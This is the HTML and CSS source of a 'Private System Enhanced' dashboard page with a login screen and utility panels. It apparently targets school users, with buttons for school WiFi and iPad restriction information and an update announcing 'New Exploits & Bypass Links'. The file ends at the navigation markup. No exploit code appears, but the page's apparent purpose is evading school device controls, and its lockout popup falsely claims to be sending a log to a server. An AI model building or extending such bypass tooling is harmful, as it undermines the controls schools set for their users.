<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System Enhanced</title>
  <style>
    /* Global Styles */
    :root {
      --dark-bg: #1a1a1a;
      --dark-text: #f9f2dc;
      --dark-box-bg: #2a2a2a;
      --dark-box-shadow: rgba(255, 145, 77, 0.3);
      --dark-box-h2-color: #ffbf80;
      --dark-accent-primary: #ff914d;
      --dark-accent-secondary: #ffb67a;
      --dark-entry-bg: #40210f;
      --dark-entry-text: #ffccb3;
      --dark-calendar-cell: #333;

      --light-bg: #f9f2dc;
      --light-text: #1a1a1a;
      --light-box-bg: #ffd966;
      --light-box-shadow: rgba(255, 145, 77, 0.6);
      --light-box-h2-color: #994d00;
      --light-accent-primary: #ff914d; /* Could change for light theme specifically if desired */
      --light-accent-secondary: #ffb67a;
      --light-entry-bg: #ffd999;
      --light-entry-text: #994d00;
      --light-calendar-cell: #ffd966;
    }

    /* Base body and typography */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', 'Montserrat', sans-serif;
    }

    body {
      margin: 0; padding: 0;
      transition: background-color 0.5s ease, color 0.5s ease;
      overflow-x: hidden; /* Prevent horizontal scroll from animations */
      position: relative;
    }

    h1, h2, h3, h4, h5, h6 {
        font-family: 'Montserrat', sans-serif;
    }

    /* Login System Styles */
    body.login-body {
      background: var(--dark-bg);
      color: var(--dark-text);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      background: #000;
      border-radius: 20px;
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 360px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s;
    }

    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }

    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }

    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: #1c1c1c;
      border: none;
      color: white;
      border-radius: 8px;
      font-size: 1em;
    }

    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
    }

    #showPassword:checked + span {
      color: var(--dark-accent-primary);
    }

    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: var(--dark-accent-primary);
      color: black;
      font-weight: bold;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    .login-box button:hover {
        background-color: var(--dark-accent-secondary);
    }

    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: red;
    }

    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
    }

    .popup input {
      margin-bottom: 15px;
    }
    .popup button {
        background-color: red !important;
        color: white !important;
    }
    .popup button:hover {
        background-color: darkred !important;
    }

    /* Dashboard Styles */
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: var(--dark-bg);
      color: var(--dark-text);
      padding: 20px;
      zoom: 1; /* Retain original zoom, but will be overridden by zoom buttons */
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    body.dashboard-body.light-theme {
      background-color: var(--light-bg);
      color: var(--light-text);
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--dark-accent-primary);
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }

    body.dashboard-body.light-theme .dashboard-header {
      background: var(--light-accent-primary); /* Keep consistent or change if a specific light primary accent is wanted */
    }

    .dashboard-header h1 {
      font-size: 24px;
      margin: 0;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: #ffd966;
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      box-shadow: inset 0 0 5px rgba(0,0,0,0.1);
    }

    .top-panel-buttons,
    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 15px;
      flex-wrap: wrap;
    }
    
    .top-panel-buttons button,
    .quick-bar button {
      background-color: var(--dark-accent-primary);
      border: none;
      padding: 12px 18px; /* Slightly larger for main buttons */
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s ease, transform 0.1s ease;
      min-width: 120px;
      white-space: nowrap;
      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
      position: relative; /* For animations or tooltips */
      overflow: hidden;
    }

    .top-panel-buttons button:hover,
    .quick-bar button:hover {
      background-color: var(--dark-accent-secondary);
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
    }

    body.dashboard-body.light-theme .top-panel-buttons button,
    body.dashboard-body.light-theme .quick-bar button {
      background-color: var(--light-box-bg);
    }

    body.dashboard-body.light-theme .top-panel-buttons button:hover,
    body.dashboard-body.light-theme .quick-bar button:hover {
        background-color: var(--dark-accent-primary); /* Use a darker hover for light mode */
    }

    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
    }
    #panicBtn:hover {
        background: #cc0000 !important;
    }

    /* Loading Screen Overlay */
    #loadingOverlay {
        position: fixed;
        top: 0; left: 0;
        width: 100vw; height: 100vh;
        background-color: #000;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        z-index: 1000;
        color: white;
        font-family: 'Courier New', monospace;
        font-size: 2em;
        text-shadow: 0 0 10px white;
    }

    .loading-box-animation {
        position: relative;
        width: 300px;
        height: 100px;
        border: 2px solid white;
        display: flex;
        justify-content: center;
        align-items: center;
        margin-bottom: 20px;
        opacity: 0;
        transform: scale(0.8);
        animation: fadeInScale 1.5s forwards;
        box-shadow: 0 0 20px white;
    }
    .loading-box-animation.hidden {
        animation: fadeOutScale 1.5s forwards;
    }

    @keyframes fadeInScale {
        from { opacity: 0; transform: scale(0.8); box-shadow: 0 0 5px white; }
        to { opacity: 1; transform: scale(1); box-shadow: 0 0 20px white; }
    }
    @keyframes fadeOutScale {
        from { opacity: 1; transform: scale(1); box-shadow: 0 0 20px white; }
        to { opacity: 0; transform: scale(0.8); box-shadow: 0 0 5px white; }
    }
    /* Notification System */
    #notificationArea {
        position: fixed;
        top: 20px;
        right: 20px;
        width: 300px;
        max-height: 90vh;
        overflow-y: auto;
        display: flex;
        flex-direction: column-reverse; /* New notifications at the bottom of the stack */
        gap: 10px;
        z-index: 100;
        pointer-events: none; /* Allows clicks through notifications if needed */
    }

    .notification {
        background-color: rgba(42, 42, 42, 0.9);
        color: var(--dark-text);
        padding: 15px;
        border-radius: 8px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        opacity: 0;
        transform: translateX(100%);
        animation: slideInFadeOut 6s forwards; /* Default animation time */
        position: relative;
        border-left: 5px solid var(--dark-accent-primary);
        font-size: 0.9em;
        transition: background-color 0.3s ease, border-color 0.3s ease;
    }
    .dashboard-body.light-theme .notification {
        background-color: rgba(255, 217, 102, 0.9);
        color: var(--light-text);
        border-left-color: var(--light-box-h2-color);
    }
    .notification.info { border-left-color: #3498db; }
    .notification.success { border-left-color: #2ecc71; }
    .notification.warning { border-left-color: #f39c12; }
    .notification.error { border-left-color: #e74c3c; }

    @keyframes slideInFadeOut {
        0% { opacity: 0; transform: translateX(100%); }
        10% { opacity: 1; transform: translateX(0%); }
        90% { opacity: 1; transform: translateX(0%); }
        100% { opacity: 0; transform: translateX(100%); }
    }
    /* Long-lived notifications for "log" style. Remove fade-out */
    .notification.static {
        animation: slideIn 0.5s forwards;
        opacity: 1;
        transform: translateX(0);
        pointer-events: auto; /* Re-enable pointer events for static notifications if dismissible */
        transition: transform 0.3s ease-out, opacity 0.3s ease-out, background-color 0.3s ease;
    }
    .notification.static.dismissing {
        transform: translateX(100%);
        opacity: 0;
    }
    @keyframes slideIn {
        from { opacity: 0; transform: translateX(100%); }
        to { opacity: 1; transform: translateX(0%); }
    }
    .notification .dismiss-btn {
        position: absolute;
        top: 5px;
        right: 5px;
        background: transparent;
        border: none;
        color: #ccc;
        font-size: 1.2em;
        cursor: pointer;
        line-height: 1;
        pointer-events: auto;
    }
    .notification .dismiss-btn:hover {
        color: white;
    }

    .announcement-bar {
      width: 100%;
      background-color: var(--dark-accent-primary);
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    body.dashboard-body.light-theme .announcement-bar {
      background-color: #ffd966;
      color: #000;
    }

    .main-grid-container {
      display: flex;
      flex-direction: column;
      gap: 20px;
      flex-grow: 1;
    }

    .main-row {
      display: flex;
      gap: 20px;
      flex-wrap: wrap;
    }

    .box {
      background-color: var(--dark-box-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px var(--dark-box-shadow);
      min-height: 120px;
      transition: background-color 0.3s ease, color 0.3s ease, box-shadow 0.3s ease;
      flex: 1 1 300px;
      display: flex;
      flex-direction: column;
    }

    body.dashboard-body.light-theme .box {
      background-color: var(--light-box-bg);
      color: var(--light-text);
      box-shadow: 0 0 15px var(--light-box-shadow);
    }

    .box h2 {
      font-size: 18px;
      margin-top: 0;
      margin-bottom: 10px;
      color: var(--dark-box-h2-color);
      transition: color 0.3s ease;
    }

    body.dashboard-body.light-theme .box h2 {
      color: var(--light-box-h2-color);
    }

    .box p, .box ul, .box ol {
      font-size: 14px;
      margin: 0;
      line-height: 1.5;
    }
    .box ul { padding-left: 20px; }

    .update-entry, .reminder-entry {
      background: var(--dark-entry-bg);
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: var(--dark-entry-text);
      font-size: 0.9em;
      transition: background-color 0.3s ease, color 0.3s ease;
    }
    .update-entry:hover, .reminder-entry:hover {
        transform: translateX(3px);
        background-color: rgba(64, 33, 15, 0.7); /* Slightly lighter on hover */
    }


    body.dashboard-body.light-theme .update-entry,
    body.dashboard-body.light-theme .reminder-entry {
      background: var(--light-entry-bg);
      color: var(--light-entry-text);
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: var(--dark-calendar-cell);
      border-radius: 4px;
      transition: background-color 0.3s ease, color 0.3s ease;
    }

    .today {
      background: var(--dark-accent-primary) !important;
      font-weight: bold;
      color: black;
    }

    body.dashboard-body.light-theme .calendar div {
      background: var(--light-calendar-cell);
      color: var(--light-text);
    }

    body.dashboard-body.light-theme .today {
      background: var(--light-box-h2-color) !important; /* Changed accent for light mode */
      color: var(--light-bg);
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      background-color: var(--dark-box-bg);
      padding: 20px;
      border-radius: 12px;
    }
    body.dashboard-body.light-theme #canvasContainer {
      background-color: var(--light-box-bg);
    }

    #notesCanvas {
      border: 2px solid var(--dark-accent-primary);
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
      transition: border-color 0.3s ease;
    }

    #canvasControls {
      margin-top: 10px;
    }

    #canvasControls button {
      background-color: var(--dark-accent-primary);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;

      transition: background 0.2s ease;
      margin: 0 5px;
    }

    #canvasControls button:hover {
      background-color: var(--dark-accent-secondary);
    }

    .motivation-box {
      background-color: #333;
      color: #ffd966;
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      transition: background-color 0.3s ease, color 0.3s ease;
    }

    body.dashboard-body.light-theme .motivation-box {
      background-color: #fff3cc;
      color: #994d00;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.8);
    }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: var(--dark-box-bg);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px var(--dark-box-shadow);
      transition: background-color 0.3s ease, color 0.3s ease;
    }

    body.dashboard-body.light-theme .info-panel {
      background-color: var(--light-box-bg);
      color: var(--light-text);
    }

    .info-panel h2 {
      color: var(--dark-accent-primary);
      margin-top: 0;
      margin-bottom: 15px;
      transition: color 0.3s ease;
    }

    body.dashboard-body.light-theme .info-panel h2 {
      color: var(--light-box-h2-color);
    }
    
    .info-panel button,
    .info-panel a.button {
        background-color: var(--dark-accent-primary);
        border: none;
        padding: 10px 15px;
        border-radius: 8px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s ease, transform 0.1s ease;
        text-decoration: none;
        display: inline-block;
        text-align: center;
        margin: 5px;
    }
    .info-panel button:hover,
    .info-panel a.button:hover {
        background-color: var(--dark-accent-secondary);
        transform: translateY(-1px);
    }
    body.dashboard-body.light-theme .info-panel button,
    body.dashboard-body.light-theme .info-panel a.button {
        background-color: var(--light-entry-bg);
        color: var(--light-entry-text);
    }
    body.dashboard-body.light-theme .info-panel button:hover,
    body.dashboard-body.light-theme .info-panel a.button:hover {
        background-color: var(--light-box-h2-color);
        color: var(--light-bg);
    }

    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: var(--dark-calendar-cell);
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      transition: background-color 0.3s ease;
    }

    body.dashboard-body.light-theme .wifi-grid div {
      background: var(--light-entry-bg);
    }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: var(--dark-entry-bg);
      border-radius: 6px;
      text-align: center;
      font-size: 0.9em;
      transition: background-color 0.3s ease;
    }

    body.dashboard-body.light-theme .wifi-entry div {
      background: var(--light-entry-bg);
    }

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons,
    .grid-container-4, .grid-container-3, .grid-container-2, .grid-container-1 {
      display: grid;
      gap: 10px;
      margin-top: 15px;
    }
    .grid-container-4 { grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); }
    .grid-container-3 { grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); }
    .grid-container-2 { grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); }
    .grid-container-1 { grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); }

    .links-list a, .handbook-buttons a, .exploit-buttons a {
      display: block;
      background-color: var(--dark-accent-primary);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s ease;
      text-decoration: none;
      text-align: center;
    }

    .links-list a:hover, .handbook-buttons a:hover, .exploit-buttons a:hover {
      background-color: var(--dark-accent-secondary);
      transform: translateY(-2px);
    }

    .coming-soon {
      background: var(--dark-entry-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      font-style: italic;
      color: var(--dark-entry-text);
      opacity: 0.8;
      transition: background-color 0.3s ease;
    }

    body.dashboard-body.light-theme .coming-soon {
      background: var(--light-entry-bg);
      color: var(--light-entry-text);
    }

    .info-text, .section-content {
      background: var(--dark-entry-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      transition: background-color 0.3s ease;
    }
    .info-text p, .section-content p {
        margin-top: 0;
        margin-bottom: 10px;
        line-height: 1.6;
        font-size: 0.95em;
    }
    .info-text strong, .section-content strong {
        color: var(--dark-box-h2-color);
    }

    body.dashboard-body.light-theme .info-text,
    body.dashboard-body.light-theme .section-content {
      background: var(--light-entry-bg);
    }
    body.dashboard-body.light-theme .info-text strong,
    body.dashboard-body.light-theme .section-content strong {
        color: var(--light-box-h2-color);
    }


    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: var(--dark-entry-bg);
      padding: 12px;
      border-radius: 8px;
      transition: background-color 0.3s ease;
    }

    body.dashboard-body.light-theme .school-info-item {
      background: var(--light-entry-bg);
    }

    .school-info-label {
      font-weight: bold;
      color: var(--dark-accent-primary);
      margin-bottom: 5px;
      font-size: 0.95em;
      transition: color 0.3s ease;
    }

    body.dashboard-body.light-theme .school-info-label {
      color: var(--light-box-h2-color);
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
      background-color: var(--dark-accent-primary);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s ease;
    }

    .ipad-options button:hover {
      background-color: var(--dark-accent-secondary);
      transform: translateY(-2px);
    }

    .ipad-content, .bypass-content {
      display: none;
      background: var(--dark-entry-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      transition: background-color 0.3s ease;
    }
    .ipad-content.active, .bypass-content.active {
        display: block;
        animation: fadeIn 0.5s ease-out;
    }
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }


    body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content {
      background: var(--light-entry-bg);
    }

    /* Form Styles within info panels (e.g., Settings, Reminders) */
    .form-group {
        margin-bottom: 15px;
        padding-bottom: 15px;
        border-bottom: 1px dashed rgba(255, 255, 255, 0.1);
    }
    .form-group:last-of-type {
        border-bottom: none;
        padding-bottom: 0;
        margin-bottom: 0;
    }
    .form-group label {
        display: block;
        margin-bottom: 8px;
        font-weight: bold;
        color: var(--dark-box-h2-color);
        font-size: 0.95em;
    }
    body.dashboard-body.light-theme .form-group label {
        color: var(--light-box-h2-color);
    }

    .form-group input[type="text"],
    .form-group input[type="password"],
    .form-group input[type="color"],
    .form-group input[type="range"],
    .form-group input[type="number"],
    .form-group input[type="date"],
    .form-group input[type="time"],
    .form-group textarea,
    .form-group select {
        width: 100%;
        padding: 10px;
        border-radius: 5px;
        border: 1px solid rgba(255, 255, 255, 0.2);
        background-color: #3d3d3d;
        color: var(--dark-text);
        font-size: 0.9em;
        transition: border-color 0.2s ease, background-color 0.2s ease;
    }
    body.dashboard-body.light-theme .form-group input[type="text"],
    body.dashboard-body.light-theme .form-group input[type="password"],
    body.dashboard-body.light-theme .form-group input[type="color"],
    body.dashboard-body.light-theme .form-group input[type="range"],
    body.dashboard-body.light-theme .form-group input[type="number"],
    body.dashboard-body.light-theme .form-group input[type="date"],
    body.dashboard-body.light-theme .form-group input[type="time"],
    body.dashboard-body.light-theme .form-group textarea,
    body.dashboard-body.light-theme .form-group select {
        background-color: var(--light-entry-bg);
        border-color: rgba(0,0,0,0.2);
        color: var(--light-text);
    }
    .form-group input:focus, .form-group textarea:focus, .form-group select:focus {
        border-color: var(--dark-accent-primary);
        outline: none;
    }

    .form-group input[type="checkbox"],
    .form-group input[type="radio"] {
        margin-right: 8px;
    }

    .form-group .checkbox-container {
        display: flex;
        align-items: center;
        gap: 8px;
        cursor: pointer;
    }
    .form-group .checkbox-container span {
        font-weight: normal;
        color: var(--dark-text);
        font-size: 0.9em;
    }
    body.dashboard-body.light-theme .form-group .checkbox-container span {
        color: var(--light-text);
    }
    .form-group input[type="checkbox"]:checked + span {
        color: var(--dark-accent-primary);
        font-weight: bold;
    }

    .setting-section {
        margin-bottom: 30px;
        padding-bottom: 20px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }
    .setting-section:last-of-type {
        border-bottom: none;
        padding-bottom: 0;
        margin-bottom: 0;
    }
    .setting-section h3 {
        color: var(--dark-accent-primary);
        font-size: 1.3em;
        margin-top: 0;
        margin-bottom: 20px;
    }
    body.dashboard-body.light-theme .setting-section h3 {
        color: var(--light-box-h2-color);
    }

    /* Specific layout for buttons within settings panel */
    .settings-button-group {
        display: flex;
        gap: 10px;
        margin-top: 10px;
        flex-wrap: wrap;
    }

    /* Calculator Specifics */
    .calculator-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 5px;
        background-color: #333;
        padding: 10px;
        border-radius: 8px;
    }
    .calculator-display {
        grid-column: span 4;
        background-color: #1a1a1a;
        color: white;
        padding: 15px;
        font-size: 1.8em;
        text-align: right;
        border-radius: 5px;
        margin-bottom: 5px;
    }
    .calculator-grid button {
        background-color: #555;
        color: white;
        padding: 15px;
        font-size: 1.2em;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.2s ease;
    }
    .calculator-grid button:hover {
        background-color: #777;
    }
    .calculator-grid button.operator { background-color: var(--dark-accent-primary); color: black; }
    .calculator-grid button.operator:hover { background-color: var(--dark-accent-secondary); }
    .calculator-grid button.clear { background-color: #c0392b; }
    .calculator-grid button.clear:hover { background-color: #e74c3c; }
    .calculator-grid button.equals { background-color: #2ecc71; }
    .calculator-grid button.equals:hover { background-color: #27ae60; }

    /* Unit Converter */
    .unit-converter-controls, .unit-converter-results {
        margin-top: 15px;
        display: grid;
        grid-template-columns: 1fr;
        gap: 10px;
    }
    .unit-converter-results div {
        background: var(--dark-entry-bg);
        padding: 10px;
        border-radius: 5px;
        font-size: 0.95em;
    }

    /* Password Generator */
    .password-output {
        background-color: var(--dark-entry-bg);
        padding: 10px;
        border-radius: 5px;
        margin-bottom: 15px;
        font-family: 'Courier New', monospace;
        word-break: break-all;
        min-height: 40px;
        display: flex;
        align-items: center;
    }

    /* Reminders specific styling */
    .reminder-add-form {
        margin-bottom: 20px;
        border-bottom: 1px dashed rgba(255, 255, 255, 0.1);
        padding-bottom: 20px;
    }
    .reminder-list-container {
        max-height: 400px;
        overflow-y: auto;
        padding-right: 10px; /* For scrollbar */
    }
    .reminder-entry {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 8px;
        padding: 10px;
        border-radius: 6px;
        border-left: 5px solid var(--dark-accent-primary);
        word-break: break-word;
    }
    .reminder-entry.completed {
        text-decoration: line-through;
        opacity: 0.7;
        border-left-color: #555;
    }
    .reminder-entry .actions button {
        margin-left: 5px;
        padding: 5px 10px;
        font-size: 0.8em;
    }
    .reminder-entry span {
        flex-grow: 1;
        padding-right: 10px;
    }
    .reminder-entry.overdue {
        border-left-color: red;
        color: #ffcccc;
    }
    body.dashboard-body.light-theme .reminder-entry.overdue {
        color: darkred;
    }

    /* Timer/Stopwatch */
    .timer-display, .stopwatch-display {
        font-size: 2.5em;
        text-align: center;
        margin-bottom: 15px;
        font-family: 'Courier New', monospace;
    }
    .timer-controls button, .stopwatch-controls button {
        margin: 5px;
    }
    .timer-inputs input {
        width: 60px;
        text-align: center;
    }
    .random-output {
        background-color: var(--dark-entry-bg);
        padding: 10px;
        border-radius: 5px;
        margin-top: 15px;
        font-size: 1.5em;
        text-align: center;
        min-height: 50px;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    #textEditor {
        width: 100%;
        height: 200px;
        margin-top: 10px;
    }
  </style>

  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>

</head>
<body class="login-body" id="bodyElement">

  <!-- Initial Loading Overlay -->
  <div id="loadingOverlay">
    <div id="initialLoadingBox" class="loading-box-animation">
      Initializing System..
    </div>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox" style="display: none;">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>
    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.6.0 (Enhanced)</div>
    </div>

    <!-- Main Global Controls (New row) -->
    <div class="top-panel-buttons">
        <button id="settingsBtn">⚙️ Settings</button>
        <button id="remindersBtn">⏰ Reminders</button>
        <button id="helpGuideBtn">❓ Help & Guides</button>
        <button id="systemStatusBtn">📊 System Status</button>
        <button id="networkToolsBtn">📡 Network Tools</button>
        <button id="aboutPanelBtn">ℹ️ About Dashboard</button>
        <button id="notificationLogBtn">📢 Notification Log</button>
    </div>

    <div class="quick-bar">
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="notesBtn">📒 Notes Canvas</button>
      <button id="exportNotesBtn">💾 Export Canvas</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Main Grid</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart Dashboard</button>
      <button id="panicBtn">🚨 Panic Button</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
    </div>

    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI V1.6.0! Check out the new settings and utility panels! 🚨</span>
    </div>

    <div class="main-grid-container">
        <div class="main-row" id="mainGrid">
            <div class="box">
                <h2>📅 Calendar</h2>
                <div class="calendar" id="calendar"></div>
            </div>

            <div class="box motivation-box" id="motivationBox">
                "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
            </div>
        </div>

        <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap;">
            <div class="box" style="flex: 1 1 300px; min-width: 300px;">
                <h2>🔄 Updates</h2>
                <div class="update-entry">Dashboard Interface Update!</div>
                <div class="update-entry">New Exploits & Bypass Links Added</div>
                <div class="update-entry">Settings & Reminders Systems Launched!</div>
            </div>

            <div class="box" style="flex: 1 1 300px; min-width: 300px;">
                <h2>🔔 System Alerts</h2>
                <p>Starting to work on log out system. Stay tuned for more!</p>
            </div>
        </div>
    </div> <!-- End main-grid-container -->


    <!-- Additional Dashboard Features - utility buttons not in quick-bar -->
    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px; margin-bottom: 30px;">
        <button onclick="dashboard.togglePanel('calculatorPanel', this)">🔢 Calculator</button>
        <button onclick="dashboard.togglePanel('unitConverterPanel', this)">↔️ Unit Converter</button>
        <button onclick="dashboard.togglePanel('weatherPanel', this)">🌤️ Weather Forecast</button>
        <button onclick="dashboard.togglePanel('textEditorPanel', this)">📝 Text Editor</button>
        <button onclick="dashboard.togglePanel('passwordGenPanel', this)">🔑 Password Generator</button>
        <button onclick="dashboard.togglePanel('qrCodeGenPanel', this)">🔲 QR Code Generator</button>
        <button onclick="dashboard.togglePanel('diceRollerPanel', this)">🎲 Dice Roller</button>
        <button onclick="dashboard.togglePanel('coinFlipperPanel', this)">🪙 Coin Flipper</button>
        <button onclick="dashboard.togglePanel('randomNumberGenPanel', this)">🔢 Random Number</button>
        <button onclick="dashboard.togglePanel('timerStopwatchPanel', this)">⏱️ Timer & Stopwatch</button>
        <button onclick="dashboard.togglePanel('digitalClockPanel', this)">⏰ Digital Clock</button>
        <button onclick="dashboard.togglePanel('secretNotesPanel', this)">🔒 Secret Notes</button>
        <button onclick="dashboard.togglePanel('resourceHubPanel', this)">📚 Resource Hub</button>
        <button onclick="dashboard.togglePanel('changelogPanel', this)">📜 Changelog</button>
    </div>

    <!-- Main Navigation for Info Panels -->
    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 0px;">
        <button onclick="dashboard.togglePanel('wifiPanel', this)">📡 School WiFi Information</button>
        <button onclick="dashboard.togglePanel('ipadPanel', this)">📱 School iPad Restrictions</button>
        <button onclick="dashboard.togglePanel('handbookPanel', this)">📘 Student Handbooks Information</button>
        <button onclick="dashboard.togglePanel('mapPanel', this)">🏫 School Building Map Information</button>
        <button onclick="dashboard.togglePanel('studentWebsitesPanel', this)">🌐 Student Website's Information</button>
        <button onclick="dashboard.togglePanel('teacherWebsitesPanel', this)">👩‍🏫 Teacher Websites Information</button>
